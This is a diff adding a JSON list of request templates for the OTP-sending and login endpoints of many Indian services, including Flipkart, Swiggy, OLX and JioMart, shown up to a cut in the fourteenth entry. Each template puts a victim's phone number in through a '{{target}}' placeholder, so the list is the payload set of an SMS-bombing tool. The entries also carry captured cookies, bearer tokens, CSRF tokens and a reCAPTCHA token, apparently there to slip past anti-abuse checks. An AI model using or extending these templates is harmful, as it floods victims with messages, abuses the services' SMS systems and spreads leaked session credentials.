@@ -1,0 +1,589 @@
+  [
+        {
+           "sno":"1",
+           "name":"Lenskart",
+           "url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+           "method": "POST",
+           "headers":{
+              "accept": "*/*",
+              "accept-encoding": "gzip, deflate, br",
+              "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+              "cache-control": "no-cache",
+              "origin": "https://www.lenskart.com",
+              "referer": "https://www.lenskart.com/",
+              "user-agent": "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+              "x-accept-language": "en",
+              "x-api-client": "desktop",
+              "x-country-code": "IN",
+              "x-country-code-override": "IN",
+              "x-session-token": "ac3c474f-52f6-4575-8239-1346e4c52abc"
+                  },
+      
+            "payload": {
+                "captcha": null,
+                "phoneCode": "+91",
+                "telephone": "{{target}}"
+          }
+              },
+
+             {
+              "sno":"2",
+              "name":"Flipkart",
+              "url":"https://1.rome.api.flipkart.com/api/7/user/otp/generate",
+              "method":"POST",
+              "headers":{
+                  
+                  "content-type":"application/json",
+                  "host":"1.rome.api.flipkart.com",
+                  "origin":"https://www.flipkart.com",
+                  "referer":"https://www.flipkart.com/",
+                  "cookie":"T=TI173737794341800150063301026500239143168384514226599339030287518694; K-ACTION=null; ud=4.rCYYxJcitGaaQYjQPydvdoC3ShcGlS4i15AUnHc6dSF-jDn0nj6MLA30fz1ZyVe23hpqnRw711TNAgeZqXSo6RiSA2a9h32YINDRAjrUkco16nN-IydIXreUDkOR6ixSzkAjx9hsLayy26qJX66qXQ; vh=641; dpr=1; rt=null; _ga=GA1.2.1504069483.1737388480; _ga_2P94RMW04V=GS1.2.1737388480.1.1.1737388538.0.0.0; vw=1366; at=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImQ2Yjk5NDViLWZmYTEtNGQ5ZC1iZDQyLTFkN2RmZTU4ZGNmYSJ9.eyJleHAiOjE3NDkyMTM2NDksImlhdCI6MTc0NzQ4NTY0OSwiaXNzIjoia2V2bGFyIiwianRpIjoiY2UwZjFkMjYtZTBiMS00YWU0LTgxOTktNjY5ZTdlYmE0NDZkIiwidHlwZSI6IkFUIiwiZElkIjoiVEkxNzM3Mzc3OTQzNDE4MDAxNTAwNjMzMDEwMjY1MDAyMzkxNDMxNjgzODQ1MTQyMjY1OTkzMzkwMzAyODc1MTg2OTQiLCJrZXZJZCI6IlZJRENFRDk0RjBDNjgyNDc3Qzg5NjFDQUZFOTUxQjg2QUIiLCJ0SWQiOiJtYXBpIiwidnMiOiJMTyIsInoiOiJDSCIsIm0iOnRydWUsImdlbiI6NH0.bfVYJGHNUFjoF4r2qwREGkHCbdePcZmUzENxTUiKXOc; Network-Type=4g; vd=VIDCED94F0C682477C8961CAFE951B86AB-1737377949772-8.1747485720.1747485649.158025697; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C20226%7CMCMID%7C59339308472066642281866297306119937264%7CMCAID%7CNONE%7CMCOPTOUT-1747492924s%7CNONE%7CMCAAMLH-1748090524%7C12%7CMCAAMB-1748090524%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_sq=flipkart-prd%3D%2526pid%253Dwww.flipkart.com%25253Aaccount%25253Alogin%2526pidt%253D1%2526oid%253DfunctionJr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT; S=d1t18ciBkP0BoVj8YPyI/Pz8GevKLYiBhghxmaQO25sWPwiCWBmK2EbWzYJdZn2VQVbII3ksVgepMrGp5Iaw5vgOfQA==; SN=VIDCED94F0C682477C8961CAFE951B86AB.TOK8728990E78A3484AA1F500A7759ADDF8.1747485737339.LO",
+                  "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                  "x-user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop"
+
+              },
+               "payload": {
+                      "loginId": "+91{{target}}"
+               }
+               },
+                   {
+
+                "sno":"3",
+                "name":"PW",
+                "url":"https://api.penpencil.co/v1/users/get-otp?smsType=0",
+                "method":"POST",
+                "headers":{
+                    "content-type":"application/json",
+                    "origin":"https://www.pw.live",
+                    "priority":"u=1, i",
+                    "randomid":"310dfb57-54c0-4b9f-90e5-a242ee0d2e66",
+                    "referer":"https://www.pw.live/",
+                    "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320"
+
+                              },
+                 "payload":{
+
+                     "username": "{{target}}", 
+                    "countryCode": "+91",
+                    "organizationId": "5eb393ee95fab7468a79d189"
+                 }
+
+                 },
+                     {
+
+                  "sno":"4",
+                  "name":"swiggy",
+                  "url":"https://www.swiggy.com/dapi/auth/sms-otp",
+                  "method":"POST",
+                  "headers":{
+                      "content-type":"application/json",
+                      "cookie":"__SW=pgiQQQiycmx1ybJEu5QL0RN0zEm-Sjjy; _device_id=8d9b633f-1e43-fa62-9bab-cb9c1c6b68bd; userLocation={%22lat%22:%2221.99740%22%2C%22lng%22:%2279.00110%22%2C%22address%22:%22%22%2C%22area%22:%22%22%2C%22showUserDefaultAddressHint%22:false}; fontsLoaded=1; _gcl_au=1.1.536367762.1746807238; _guest_tid=5a7e2f20-bf4a-4335-9623-b2cc4455348d; _sid=kky3aae6-fd99-4c71-aeb1-476cc6cf0f18; _gid=GA1.2.603657116.1747199352; _gat_0=1; _ga=GA1.2.545914147.1746807241; _ga_YE38MFJRBZ=GS2.1.s1747199353$o2$g1$t1747199382$j0$l0$h0; _ga_34JYJ0BCRN=GS2.1.s1747199353$o2$g1$t1747199382$j0$l0$h0",
+                      "origin":"https://www.swiggy.com",
+                      "priority":"u=1, i",
+                      "referer":"https://www.swiggy.com/restaurants",
+                      "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320"
+
+                            },
+                    "payload":{
+                              "mobile": "{{target}}",
+                              "csrf": "1tHdW1YXSeVl-DrObRXI-s2GgCQZf1IyEcpC_4Io"
+                          }
+
+                        },
+                        {
+                        "sno": "23",
+                        "name": "OLXAuth",
+                        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
+                        "method": "POST",
+                        "headers": {
+                          "content-type": "application/json",
+                          "cookie": "WZRK_G=c85335ef1f064061b50f779435e62492; _ga=GA1.1.GA1.2.7711148844.1747410674745; _cc_id=b663670b8aef3e0dfde6a143bef89d44; __gads=ID=4258f96e378fa0ee:T=1747410692:RT=1747486305:S=ALNI_Mbxt0pT7HaYOZGA0AWlBWcH2AJHmg; __gpi=UID=000010c423d8d650:T=1747410692:RT=1747486305:S=ALNI_MZNhIlRoTkg_Sr9r4LOwqSFHTm74A; __eoi=ID=4df1b66390fd85a8:T=1747410692:RT=1747486305:S=AA-AfjZvokC3_hmoujuFyZD0-zAG; _ga_XXHF9867T8=GS2.1.s1747488458$o3$g0$t1747488458$j0$l0$h0; _ga_M7E3P87KRC=GS2.1.s1747488458$o3$g0$t1747488458$j60$l0$h1799061201$d93dFdF3djWOe8OjkgDVrsrKEDTbYNPyTMw; bm_sz=959F703D33FF45C66E1EB27AA04CDC6B~YAAQbI0sMRcU2+6YAQAAx5j7QB0N4oc/b9oDRFHGIbZ0JWrh2xrEh0SChaeXQvbwLvCN/v4qbS9MdXK5LFmvoJJ15bqBFTyxiW1QTQQGVl1IvIk07oCscc1CLE+tPv2X77qhJhI1x17ZE4EN0ww7DLqCEVnPeDWVh70DudKVFkWM8i4NQKGGgN7GmK6RmmMZYvREl7QGvuaQo36M6CixdwEJspDlvMDral8g4DDNrdhxvYHqhvMnI5k4cSNIrt9BIahPrm8+RHdRPEScSBSB/1d0cg8nfwk5Tmz4csa9KFDlHf5vWqWiIxn1tfLpxXi3kkazrKDvnJyjGiFvu9NsAUgP7ol/h90Vi+sPb6ijSNGND1FP+cl4sIVLB8muS6W7KXqoN6Omqj7kEuQ=~4274498~3294534; si=1757731854639-b8eef925-08f2-4fc8-bea1-01a252e5415f; relevanceUser=07639161468056406; bm_mi=0796B9F3AFD967F01CA6D66757E391D1~YAAQbI0sMT4U2+6YAQAAA5r7QB06l7xRhtLOXzuC1CyeVl/eEfIi9NmJKdVwm2Jc/vyyaztbDAq19pAzBg0o+tGmhmigIMrE4wYrs4rH3fSOuttAmSPhRy/luGuUDvHcNLmTB0eCgUvRj9BCurZ/WoWdTtqa7MEs5LSNhOLnOnr80E2+jlLwonupjc4EBqdAMop7bYCQSJzQTGlnWMEG+SZSomA4oaD8S2oIuYwUe8DxhlPfXm8ywi0L5ufgBg60DlKYApHhAapATo+bOB8V6lEcm45YcYfILmt0rwjWAzTLcckz1TkLiUcNMK4DUBT66w==~1; _abck=2057239BDCFFDF20CBE6F29B920E49FF~0~YAAQbI0sMWgU2+6YAQAAOZv7QA7wUuevrBg0MwmlnXw1IiGqpws9rBSkH9+MyRsJQKL2abGbExvbUkGOsd624DzSqALB0PeuAFir/dtXAqBAxXO5KN2KibiCRjH6wGho64eRiYKWIEu462beWbQCislkQk1vy7grk6oQy13kFMd6Jtcyz5RVAuEAqcYODBtudt4GFSqtCfYCr7grX9dXy4dzPQ1rD6N/UIJFMF1Ks2DrbvdaSbS3WbIS2LRFBz/W/HFhtgHnmsqW83D8mkTs6xIo6pYTqzAb7CyneE4Hmst7dGzvCuNMa53KWNDC9YSLwhV78R+elwLoT/vZnajMRAxVVxCFehm8NtTBtWwiZ5R1wTMusrY8LccupklE/bXvmCyW/u6nOhFMksJ5yFvMyXd0pjRqeKT9A2Vbl19bVyjtPy82MciXmFmBNK6ERHBTv/e4I7VPwMbncYiqReAC6XR/4gtSXUQx66JOLJajyu+qYMcp++X3JnnS92Zo4E/bIS4Wk509guJPUGNbkzRUH98FOTCblIkAFFtXZKBiZSSibU2FJl9rdHNSfGx/UQ7aUUmsqaBI+J26gg3ajIP3J+k4S0vgX2XNj0qaNcgWlziheAs751Hggmsh6OOJ9q0rEDz+W9hRj5/SZceCE3oA8nWqohY0TtRaHhrCkylSK40DGTdLh2fuHasEnw25SquQMddl7aSIfnv6ejrRsPLtXgAYdWBAVLRsXQtic39i8ooLLEkXpI8wT9a3Zquf2P8Kc/6qrFOPpzlZgeT5u2jaH1uWDeIspxtDHU0ySsIOEjBjaCh2WQDGPhvnv7j0c8FWMgn+JAsuaQOOCokjH+unuZypSxOahjOl0vpFPQSFdOslXaH4nfKlFb82q3fVkvvlNp8PWVtYDRH2m1o7Zss549LyG/0zRVhVTMkP8GGAAihzccBfQIw8kL7gL5KcsHR+4EXtt0/VSJyBcdZYkoSFYadYgo=~-1~-1~-1~AAQAAAAE%2f%2f%2f%2f%2f%2fc8PUp4I6WzIMMeHginOHERPEENN7obrxNWJsvurZid%2fkHg+GFtUhCd74JcHvOp29YkgmT1hOJ%2fmTFYNJCA+RJ%2fWn42Z0rHcZ2D~-1; _clck=12lt04%5E2%5Efza%5E0%5E1962; home_page_banner=1; _clsk=95aeaw%5E1757731857329%5E1%5E0%5Eb.clarity.ms%2Fcollect; WZRK_S_848-646-995Z=%7B%22p%22%3A1%2C%22s%22%3A1757731855%2C%22t%22%3A1757731858%7D; _fbp=fb.1.1757731858272.44008552945185368; pbjs_debug=0; FCNEC=%5B%5B%22AKsRol_r5-a-8WR36bW_i0FE4JSqaCBVaAD5-EH5rsrcoUxtzjmodlfFNJvPjsVMfekp5l5yZuRwbJh7TAD9I7n-yZvqQrOHotgo9ifzVrExMeyUlTM4xLGsfW_GCgz-QIATxtQlg7zEzlAFFdHR-zYAL4-Ym4xNsg%3D%3D%22%5D%5D; cto_bundle=spvWGV9RaWd2T1B4ZmJLdTZPdGUxd3BJSlNGZiUyRlVZUWMwa0xkVnVXJTJCS0dReWI1Z3FJVGZNWGZzVGxKZ0ZFREVRMUp0dzQlMkIlMkJHQWhwOXNzRlo3TEQyb1Y3aVhzdlJraTJ2VGRHcnlSTGk4b01qWnRzdUduMiUyRnQwY3Y3eCUyRk5iOXI0WXFocmpkQnQ2dDR0YXNSUVlHQ2NjOXVRTXdhb2ozbHdMZWV5czRoMjUwUHBBaEF2eWREalVhYjJ2V1k2T2tkRSUyQk16QndzSUJMTHpiZ3F0RDZNM3pHMUlXYlElM0QlM0Q; bm_sv=9ABDB2688F8760E0299E377E697B6DFE~YAAQbI0sMZ8X2+6YAQAAz7b7QB0ggdc2yLc73+oNJY39LQNnuRfyd8bzvYOEVtXWGg+SiY2wyKMXBmyrHQVlzEJ7hz8NqsDzlAnnyfiy9WVDshSOgLDLuG2cCvIItb7JHhQntun/gpj3n+JZpY1zyMSCY2d4zVC52EmfhAZazh+xiAgJueCelYYa9Fbl7ySzflkM/F/DORC9lFw4kSG7MHRQyuZU7b/7dXLmt1YO9umaC1GyQN9gPEUozJhi1zbt~1; ak_bmsc=7F6AFF21B79D273FDE659FF3DB751E11~000000000000000000000000000000~YAAQbI0sMQYZ2+6YAQAAGsP7QB36OvBw1buTcoou70k2XKWaMPDoW2lOo/xBpC972pdYHia0jIaFDovPZNS0IVt6xMZ2Iq8nwPyyaRfvDcA3bMUKgKgDuIPS6+UNDSSqmH+X79+O9ec0K5BhImgyN6/M98TQ4U8mGBE4Jt0Uex4c1X7vP+sAJTuTjoA9TUTS24HEFeK0Ce2XD2kxKOg27KCaiGIiZg48mb4j+3KNbqeQ3GfVnOd4siTdvrnD2P3/OwNwbrKUdjysacL9ysSgv/r1k+uzbv56mg9o+TMo/hiJDGMY15DRzntP6BV5kayyIqpX3FhyLsAKvWoD5np/CMehks0As3CIqJhT6gacCQpNmWRYgE1iVw+85+PNOm7bfsMzX8BZnHzlSXno7dUVLv8+qSblLKiFCC96cyH7/qmeigByngbiOXvzVUE30SZVSloFdeE2+DFR/fB3TSA2p2ZCMCfesl3+bc80K8MsCvnEJjG7PwICZZxSSJOjogaX7n0TolaTXbbf81/xLCNqPV1jpqTtiGncuWI4=; _ga_KSZERL1094=GS2.1.s1757731857$o3$g0$t1757731869$j48$l0$h0",
+                          "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM5ODM1MDYiLCJhcCI6IjE4MzQ5ODk1MzQiLCJpZCI6IjJlZmI3YTllNDM0M2EyNGMiLCJ0ciI6IjRlYWNkNjdiZWE5NTE5NjU4N2IyNmIxYzNlNTVkMjgyIiwidGkiOjE3NTc3MzE4NzM1NjgsInRrIjoiNDIwMTQxOSJ9fQ==",
+                          "sec-fetch-dest": "empty",
+                          "sec-fetch-mode": "cors",
+                          "sec-fetch-site": "same-origin",
+                          "traceparent": "00-4eacd67bea95196587b26b1c3e55d282-2efb7a9e4343a24c-01",
+                          "tracestate": "4201419@nr=0-1-3983506-1834989534-2efb7a9e4343a24c----1757731873568",
+                          "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                          "x-panamera-fingerprint": "4379ccb250cf2c3bbe6374911fb40d1e#1747410664714"
+                        },
+                        "payload": {
+                          "grantType": "phone",
+                          "phone": "+91{{target}}",
+                          "language": "en-IN"
+                        }
+                      },
+
+                        {
+                        "sno":"6",
+                        "name":"jiomart",
+                        "url":"https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
+                        "method":"POST",
+                        "headers":{
+                          "content-type":"application/json",
+                          "authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzQ3MjA1MTA2LCJzYWx0IjowfQ.L5kZZU_NQ2btUiS4vWqRVsTT6LH_4QueJnkyEXHF5f0",
+                          "origin":"https://account.relianceretail.com",
+                          "priority":"u=1, i",
+                          "referer":"https://account.relianceretail.com/",
+                          "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320"
+                        },
+                        "payload":{
+                          "mobile": "{{target}}"
+                        }
+
+                        },
+                        {
+                        "sno":"7",
+                        "name":"unacademy",
+                        "url":"https://unacademy.com/api/v3/user/user_check/?enable-e",
+                        "method":"POST",
+                        "headers":{
+                          "content-type":"application/json",
+                          "cookie":"isDarkModeOn=; un_session_id=7ed424f2_21fc_466f_8d91_6e5cb7c924b7; ajs_anonymous_id=deb6739e_31a5_4455_bb2e_da13f95ce29d; anonymous_session_id=4941acd2_0bd7_4c90_a1f4_21b8f6a81937; _gcl_au=1.1.38434126.1747207151; ak_bmsc=1A6330776B26FC6E959686F67AFAEF0B~000000000000000000000000000000~YAAQh3s1F+C2YsKWAQAA+mGpzRsGRNbRNJ7610fogXus/kUmG7mLOnNv3ltgprmq4FhaJ/qB0mGkB6Ifo+zf3PZKeu7dkFYfcb+fTHiDFxzUByU3l+wzujkc35zUzgOnstSW86aTY0W9bmvunlNHqkz60sAq8pROvceTyEeGmYWSZdhxtSUWQttq5j9jJcvTzr1pdKNXEX7Ljw0utEZa3rbSpU+a0e60HEr95niXOjY+nySzLSCldeCV7DF9Y79GHcVNGfkVbHOD2WEVdnLPYTiGH4lmSAV9Wjge8LQq1FAKGm0LVDNHzBrXOHhXcbnd+YHL3WnXt/n+IYj57jOs98dUZ4JoTiWwrVwgSKy8; AMP_MKTG_d90ac5135c=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE; _ga=GA1.2.927957073.1747207160; _gid=GA1.2.532899747.1747207160; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; AMP_d90ac5135c=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI4NjFiOGFlYS1kNGQ0LTQyY2ItOTI5My1lYzc0ZjM3MTQ0ZmMlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJOQSUyMiUyQyUyMnNlc3Npb25JZCUyMiUzQTE3NDcyMDcxNTQ4NjUlMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNzQ3MjA3MTYwNjQ0JTJDJTIybGFzdEV2ZW50SWQlMjIlM0E0JTJDJTIycGFnZUNvdW50ZXIlMjIlM0ExJTdE; _fbp=fb.1.1747207165399.350896326502752831",
+                          "origin":"https://unacademy.com",
+                          "priority":"u=1, i",
+                          "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                          "x-platform":"0"
+                        },
+                        "payload":{
+                          "phone": "{{target}}",
+                          "country_code": "IN",
+                          "otp_type": 1,
+                          "email": "",
+                          "send_otp": "true,…"
+                        }
+
+                        },
+
+                        {
+                        "sno":"8",
+                        "name":"doubtnut",
+                        "url":"https://api.doubtnut.com/v4/student/login",
+                        "method":"POST",
+                        "headers":{
+                          "origin":"https://www.doubtnut.com",
+                          "priority":"u=1, i",
+                          "referer":"https://www.doubtnut.com/",
+                          "content-type":"application/json",
+                          "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                          "version_code":"1500"
+                        },
+                        "payload":{
+                          "phone_number":"{{target}}", 
+                          "is_web": "3"
+                        }
+                      },
+                      {
+                        "sno":"9",
+                        "name":"shopsy",
+                        "url":"https://www.shopsy.in/1.rome/api/1/action/view",
+                        "method":"POST",
+                        "headers":{
+                          "content-type":"application/json",
+                        "cookie":"T=hyhlwtbafpquno1hp2o4rbnr-BR1746472260197; DC_ID=1; _ga=GA1.1.398706618.1746472264; _gcl_gs=2.1.k1$i1746805921$u221990106; _gcl_aw=GCL.1746805936.CjwKCAjwz_bABhAGEiwAm-P8YTvP1Daembn-bGCMXkoIHAkwSoZL-t6FZvd9POeZjLSA_-nBUkDLHxoCgJwQAvD_BwE; ud=1.Sf6wmi1txOQ-py5AqyL1KkuWvkCW7BYMhaBZfS7fpwDt3_P4E9Ei1gyh974W7yCQbt2hfStb_UmtY6dAPVSQTST_pCs9e90bj4nkBKQaDQSQMv_rOhuWtbhiibjhP6aPq45Vdw6lNUrA5DRpZzsP5Xt2lgrCRC3OsiV9eZ1JuZLUi82rwz1ELewN_jWuYslTdwbNcgrVOOxDdfAe4zDjFg; vd=VIC603EBBAE4D642C2AAE2098E6A88F232-1746472260332-3.1747376111.1747376111.155621238; S=d1t16Pz8/BHU/PzlaP34/cBY/XcWgI8d19+MwpaGokp03RRnkTLnai0KRzqGTIUXcMncWrdRqIuFDuE5EjxOieg0NWQ==; vw=1280; _gcl_au=1.1.1591092066.1747376121; _ga_MF2PJ1ME3R=GS2.1.s1747376121$o3$g1$t1747376121$j60$l0$h0; at=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImQ2Yjk5NDViLWZmYTEtNGQ5ZC1iZDQyLTFkN2RmZTU4ZGNmYSJ9.eyJleHAiOjE3NDkxMDQxMTEsImlhdCI6MTc0NzM3NjExMSwiaXNzIjoia2V2bGFyIiwianRpIjoiMzc0OWU4NTQtZmQ2ZC00NTcyLWE1ZDMtNDBlZDExZjgzMDcxIiwidHlwZSI6IkFUIiwiZElkIjoiaHlobHd0YmFmcHF1bm8xaHAybzRyYm5yLUJSMTc0NjQ3MjI2MDE5NyIsImtldklkIjoiVklDNjAzRUJCQUU0RDY0MkMyQUFFMjA5OEU2QTg4RjIzMiIsInRJZCI6Im1hcGkiLCJ2cyI6IkxPIiwieiI6IkNIIiwibSI6dHJ1ZSwiZ2VuIjozfQ.hrXNXUXTHBy8eGhjXrn0IpHu4sNRkqucB8NjCwTILiI; SN=VIC603EBBAE4D642C2AAE2098E6A88F232.TOK2902A9415B554FAE8C71940AE537F25A.1747376122915.LO",
+                        "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                        "x-user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 FKUA/msite/0.0.4/msite/Mobile"
+                        },
+                        "payload":{
+                          "actionRequestContext": {
+                              "loginIdPrefix": "+91",
+                              "loginId": "{{target}}",
+                              "loginType": "MOBILE",
+                              "screenName": "LOGIN_V4_MOBILE",
+                              "sourceContext": "DEFAULT",
+                              "type": "LOGIN_IDENTITY_VERIFY",
+                              "verificationType": "OTP",
+                              "clientQueryParamMap": {
+                                  "ret": "/",
+                                  "entryPage": "HEADER_ACCOUNT"
+                              }
+                          }
+                      }
+
+                      },
+                      {
+                        "sno":"10",
+                        "name":"newton-school",
+                        "url":"https://my.newtonschool.co/api/v1/user/otp/?registration=true&login_if_registered=true",
+                        "method":"POST",
+                        "headers":{
+                          "content-type":"application/json",
+                          "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                          "origin":"https://university.newtonschool.co",
+                          "priority":"u=1, i",
+                          "referer":"https://university.newtonschool.co/"
+                        },
+                        "payload":{
+                            "g-recaptcha-response":"03AFcWeA5FtiPZVeBm0nQuH8_m-ClOQBiOiZ3qXxQi8SlNzW1wfOXdTXRlUoMgeJKXIhlqlckXHMYLyoJagesjt0lafeOXkuTAlGPDUPae5kpVEleMFevMFTAQ-q7E6Jk-3DHGG3VWN68cFqOJPXuhTRs7pBPvblvHiRcMbUeDYIFIn12rwXDCFkR60Xd8yU9xfcH6b7fTkmRXCKdDi3yxWm5LYK4HPLq1VgyfI8Fqfz6a9xw6MLG5eTIxq8zkGwgfXd1RqKlm8m3krtmmdL4yD54PPEztzRhMmXJ59hoZrzvYnzmYKQ_LXgw3MaEtvyYdjJXU0F6tlBFbi20ywp9pszPLu02-rbo0b9wYFLvbYgiHgUH1jeev7UeF42_1CBKg29TRc9qSA2xAEQ8uoD3js8Wn72Noz_whcamDi6bfTw09PfBd6ilgMCbyR04DS6DrtK7tXnDLM01scnIAxhXwxKmCC_VkirdsQdncZdOhZ-FMFBCLmRBORkpGvllBA8iwtF3mVYCJl3bZD5vuweAh5NT6thGm46WD-VsIXogQIcz_T_RAy2rxYsQ4fGHf_xoHTFT3fqvrtf9n20GH0AFKtMaqZ2UW45U2DyynyVqZ3uIna7h1d4yUeJTcG-vd-H1e-CjoDbyLXKTTAxS-bUPV_CBUAS3js5quPn18AfQ0ONBlDI1IEJKmQRoY8WcXt2P7cHnLWdFh14zwshtFpvm0SG0SfTMOYoMp7lNXQRuo2k39Iz6SzoND1aqR36yH3Kc8VKB7ZyAEkXE9Q7ibjFs1KXs-1_a_MKEarZ_WRJrnKlPISSEtYrmwhvR9BzX_El0thjtnzxGuAELBgcZjU-4FsHARtoBDjo1VdLpFB_MhSji6X7sjI4pTwrcCdMdbBUMlq-TQc1AgUxT7q9abau5cdRVgYzXorIuDuvThPKlaHlYMVrAUHC6ZXCchfeEDhHexyEkUU9Yoc4AT",
+                          "phone":"+91{{target}}"
+                        }
+                      },
+
+                        {
+                        "sno":"11",
+                        "name":"Allen",
+                        "url":"https://api.allen-live.in/api/v1/auth/sendOtp",
+                        "method":"POST",
+                        "headers":{ 
+                                  "content-type":"application/json",
+                                  "sentry-trace":"473822f6e03f48629b144b3887ec1d48-aef1c9d2ced62a08-0",
+                                  "x-client-type":"mweb",
+                                  "x-device-id":"f8a9db9c-38e3-4a66-bd11-d54433180739",
+                                  "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 CrKey/1.54.250320",
+                                  "x-referrer":"https://allen.in/jee/online-test-series?utm_source=Google_Pmax&utm_medium=cpc&utm_campaign=EDM_PURCHASE_GOOGLE_PMAX_SELF_STUDY_JEE_OLTS_PAN-INDIA_2526_202504_ay_26&utm_adset=JEE_SELF_STUDY&utm_placement=&utm_campaignid=22398125979&utm_adsetid=6565213642&utm_sitelink=&gad_source=1&gad_campaignid=22404625133&gbraid=0AAAAAo5PAxj4OWBQRkJk5m5hv01dl8ij5&gclid=CjwKCAjwq9rFBhAIEiwAGVAZP1D9qCFe-GTv6I7-dViJ3F3sG8bKOo5BCm-gRgui56OWx35fqTiwXRoC9QsQAvD_BwE"
+                        },
+                        "payload":{
+                            "country_code": "91",
+                            "phone_number": "{{target}}",
+                            "persona_type": "STUDENT"
+                        }
+                      },
+                        {
+                        "sno":"12",
+                        "name":"aakash",
+                        "url":"https://anthe.aakash.ac.in/anthe/global-otp-verify",
+                        "method":"POST",
+                        "headers":{ 
+                              "accept": "*/*",
+                              "accept-encoding": "gzip, deflate, br, zstd",
+                              "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+                              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                              "origin": "https://anthe.aakash.ac.in",
+                              "referer": "https://anthe.aakash.ac.in/anthe",
+                              "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                              "x-requested-with": "XMLHttpRequest"
+                        },
+                                    
+                        "payload":{
+                           "mobileparam": "{{target}}",  
+                           "global_data_id": "anthe-otp",
+                           "student_name": "",
+                           "corpid": ""
+                        }
+                      },
+                        {
+                        "sno":"13",
+                        "name":"infinity learn",
+                        "url":"https://comservice.infinitylearn.com/api/v2/generate-otp",
+                        "method":"POST",
+                        "headers":{ 
+                                 "accept": "application/json, text/plain, */*",
+                                  "accept-encoding": "gzip, deflate, br, zstd",
+                                  "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+                                  "authorization": "Bearer ",  
+                                  "content-type": "application/json",
+                                  "origin": "https://student.infinitylearn.com",
+                                  "ot-tenant": "infinitylearn",
+                                  "referer": "https://student.infinitylearn.com/",
+                                  "user-agent":"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                                  "x-deviceid": "152.56.141.110",
+                                  "x-platform": "web",
+                                  "x-tenant": "infinitylearn"
+
+                        },
+
+
+                        "payload":{
+                          "isd_code": "+91",
+                          "phone": "{{target}}",
+                          "tenant_id": "1",
+                          "product_id": "300"
+                        }
+                      },
+                        {
+                        "sno":"14",
+                        "name":"nuvama wealth",
+                        "url":"https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
+                        "method":"POST",
+                        "headers":{ 
+                              "accept": "*/*",
+                              "accept-encoding": "gzip, deflate, br, zstd",
+                              "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
